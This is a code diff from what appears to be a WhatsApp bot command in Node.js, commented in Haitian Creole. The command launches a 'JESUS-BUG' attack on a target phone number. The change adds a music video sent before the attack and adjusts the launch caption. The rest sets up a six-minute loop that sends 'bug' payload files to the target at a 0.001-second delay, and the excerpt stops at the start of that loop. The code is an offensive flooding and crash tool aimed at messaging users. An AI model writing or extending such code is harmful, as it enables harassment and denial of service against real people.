@@ -44,16 +44,25 @@ cmd({
       }, { quoted: mek });
     }
 
-    // 🆕 VOYE PHOTO AK MESAJ
+    // 🖼️ VOYE IMG AVAN ATAK
     const imagePath = path.join(__dirname, '../media/1.png');
     const imageBuffer = fs.readFileSync(imagePath);
     await bot.sendMessage(from, {
       image: imageBuffer,
-      caption: `🚨 𝐉𝐄𝐒𝐔𝐒-𝐁𝐔𝐆 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃\n👤 Target: wa.me/${targetNumber}\n🕒 Duration: 6min\n⚡ Delay: 0.001s\n📦 Payloads: ${bugFiles.length}`,
+      caption: `🚨 𝐉𝐄𝐒𝐔𝐒-𝐁𝐔𝐆 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃\n\n👤 Target: wa.me/${targetNumber}\n🕒 Duration: 6min\n⚡ Delay: 0.001s\n📦 Payloads: ${bugFiles.length}`,
     }, { quoted: mek });
 
-    // Kòmanse atak la
-    const endTime = Date.now() + (6 * 60 * 1000); // 6 minutes
+    // 🎵 VOYE MIZIK JUSTE APRÈ
+    const audioPath = path.join(__dirname, '../media/5.mp4');
+    const audioBuffer = fs.readFileSync(audioPath);
+    await bot.sendMessage(from, {
+      video: audioBuffer,
+      mimetype: 'video/mp4',
+      caption: '🎵 Mizik lan ap jwe pandan bug la...'
+    }, { quoted: mek });
+
+    // 🚀 KÒMANSE ATAK LA
+    const endTime = Date.now() + (6 * 60 * 1000); // 6 min
 
     while (Date.now() < endTime) {
       for (const file of bugFiles) {
